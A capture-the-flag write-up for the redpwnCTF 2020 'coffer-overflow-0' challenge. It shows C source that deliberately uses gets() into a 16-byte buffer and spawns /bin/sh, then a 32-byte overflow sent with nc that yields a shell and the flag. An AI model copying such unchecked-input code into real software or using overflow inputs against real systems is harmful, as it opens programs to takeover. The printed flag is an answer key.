# coffer-overflow-0

Author: [roerohan](https://github.com/roerohan)

This is a simple buffer overflow challenge.

# Requirements

- Basic Buffer overflow.

# Source

- [coffer-overflow-0](./coffer-overflow-0).

```
Can you fill up the coffers? We even managed to find the source for you.

nc 2020.redpwnc.tf 31199
```

```c
#include <stdio.h>
#include <string.h>

int main(void)
{
  long code = 0;
  char name[16];
  
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("Welcome to coffer overflow, where our coffers are overfilling with bytes ;)");
  puts("What do you want to fill your coffer with?");

  gets(name);

  if(code != 0) {
    system("/bin/sh");
  }
}
```

# Exploitation

The goal is clear, we have to somehow set a non-zero value in `code`.
<br />

We see in the code snippet that `name` is alloted 16 bytes, and `code` is alloted 8 bytes (long, 64-bit). Also, the `gets()` function is used, which does not check the size of the input. So, we can simply write past the space alloted for `name` and write into `code`.
<br />

Space in the stack is generally assigned in multiples of 16, so for this function, 32 bits will be assigned. We can simply fill this with `a`s, each `a` being 1 byte, and fill up everything, thus changing the value of `code` as well. We get a shell.

```bash
$ python2 -c "print 'a'*32"
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

$ nc 2020.redpwnc.tf 31199
Welcome to coffer overflow, where our coffers are overfilling with bytes ;)
What do you want to fill your coffer with?
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
ls
Makefile
bin
coffer-overflow-0
coffer-overflow-0.c
dev
flag.txt
lib
lib32
lib64
cat flag.txt
flag{b0ffer_0verf10w_3asy_as_123}
```

The flag is:

```
flag{b0ffer_0verf10w_3asy_as_123}
```